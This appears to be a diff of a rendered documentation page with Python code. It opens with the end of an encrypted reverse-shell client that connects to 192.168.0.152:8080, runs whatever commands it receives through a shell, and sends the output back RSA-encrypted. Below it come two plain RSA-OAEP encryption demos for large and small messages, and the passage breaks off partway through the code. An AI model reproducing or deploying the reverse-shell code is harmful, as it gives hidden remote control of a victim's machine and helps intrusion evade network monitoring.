+</span><span id="__span-1-78"><a id="__codelineno-1-78" name="__codelineno-1-78"></a>    <span class="n">encryptedData</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span><span id="__span-1-79"><a id="__codelineno-1-79" name="__codelineno-1-79"></a>    <span class="k">return</span> <span class="n">encryptedData</span>
+</span><span id="__span-1-80"><a id="__codelineno-1-80" name="__codelineno-1-80"></a>
+</span><span id="__span-1-81"><a id="__codelineno-1-81" name="__codelineno-1-81"></a><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
+</span><span id="__span-1-82"><a id="__codelineno-1-82" name="__codelineno-1-82"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span id="__span-1-83"><a id="__codelineno-1-83" name="__codelineno-1-83"></a>    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.0.152&#39;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">))</span>
+</span><span id="__span-1-84"><a id="__codelineno-1-84" name="__codelineno-1-84"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-1-85"><a id="__codelineno-1-85" name="__codelineno-1-85"></a>        <span class="n">command</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span id="__span-1-86"><a id="__codelineno-1-86" name="__codelineno-1-86"></a>
+</span><span id="__span-1-87"><a id="__codelineno-1-87" name="__codelineno-1-87"></a>        <span class="n">command</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span><span id="__span-1-88"><a id="__codelineno-1-88" name="__codelineno-1-88"></a>        <span class="nb">print</span> <span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span><span id="__span-1-89"><a id="__codelineno-1-89" name="__codelineno-1-89"></a>        <span class="k">if</span> <span class="s1">&#39;terminte&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+</span><span id="__span-1-90"><a id="__codelineno-1-90" name="__codelineno-1-90"></a>            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-1-91"><a id="__codelineno-1-91" name="__codelineno-1-91"></a>            <span class="k">break</span>
+</span><span id="__span-1-92"><a id="__codelineno-1-92" name="__codelineno-1-92"></a>        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-1-93"><a id="__codelineno-1-93" name="__codelineno-1-93"></a>            <span class="n">CMD</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span><span id="__span-1-94"><a id="__codelineno-1-94" name="__codelineno-1-94"></a>            <span class="n">result</span> <span class="o">=</span> <span class="n">CMD</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-1-95"><a id="__codelineno-1-95" name="__codelineno-1-95"></a>            <span class="nb">print</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+</span><span id="__span-1-96"><a id="__codelineno-1-96" name="__codelineno-1-96"></a>            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">470</span><span class="p">:</span>
+</span><span id="__span-1-97"><a id="__codelineno-1-97" name="__codelineno-1-97"></a>                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">),</span> <span class="mi">470</span><span class="p">):</span>
+</span><span id="__span-1-98"><a id="__codelineno-1-98" name="__codelineno-1-98"></a>                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="n">i</span><span class="p">:</span><span class="mi">470</span><span class="o">+</span><span class="n">i</span><span class="p">]</span>
+</span><span id="__span-1-99"><a id="__codelineno-1-99" name="__codelineno-1-99"></a>                    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+</span><span id="__span-1-100"><a id="__codelineno-1-100" name="__codelineno-1-100"></a>            <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-1-101"><a id="__codelineno-1-101" name="__codelineno-1-101"></a>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+</span><span id="__span-1-102"><a id="__codelineno-1-102" name="__codelineno-1-102"></a><span class="n">connect</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="rsa-enc-big-message">RSA Enc Big Message</h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="nb">print</span> <span class="p">(</span><span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>    <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
-</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
-</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="n">message</span> <span class="o">=</span> <span class="s1">&#39;H&#39;</span><span class="o">*</span><span class="mi">500</span>
-</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
-</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">470</span><span class="p">:</span> <span class="c1"># To check the size limitation of messages, which is 470 bites when key size is 4096 bits</span>
-</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">),</span> <span class="mi">470</span><span class="p">):</span> <span class="c1"># We will split the messages into chunks so it can be processed</span>
-</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>        <span class="n">chunk</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="n">i</span><span class="p">:</span><span class="mi">470</span><span class="o">+</span><span class="n">i</span><span class="p">]</span>
-</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>        <span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="k">else</span><span class="p">:</span>
-</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>    <span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>    <span class="nb">print</span> <span class="p">(</span><span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>    <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="n">message</span> <span class="o">=</span> <span class="s1">&#39;H&#39;</span><span class="o">*</span><span class="mi">500</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20"></a>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">470</span><span class="p">:</span> <span class="c1"># To check the size limitation of messages, which is 470 bites when key size is 4096 bits</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">),</span> <span class="mi">470</span><span class="p">):</span> <span class="c1"># We will split the messages into chunks so it can be processed</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23"></a>        <span class="n">chunk</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="n">i</span><span class="p">:</span><span class="mi">470</span><span class="o">+</span><span class="n">i</span><span class="p">]</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24"></a>        <span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a><span class="k">else</span><span class="p">:</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a>    <span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="rsa-enc-small-messages">RSA Enc Small messages</h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>    <span class="k">return</span> <span class="n">encrypted_data</span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="n">message</span> <span class="o">=</span> <span class="s1">&#39;H&#39;</span><span class="o">*</span><span class="mi">470</span> <span class="c1"># Limitation on size of the clear text message is 470 bytes with a key size of 4096 bits</span>
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>    <span class="nb">print</span> <span class="p">(</span><span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
-</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span>
+<span class="normal"><a href="#__codelineno-3-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>    <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>    <span class="k">return</span> <span class="n">encrypted_data</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="n">message</span> <span class="o">=</span> <span class="s1">&#39;H&#39;</span><span class="o">*</span><span class="mi">470</span> <span class="c1"># Limitation on size of the clear text message is 470 bytes with a key size of 4096 bits</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
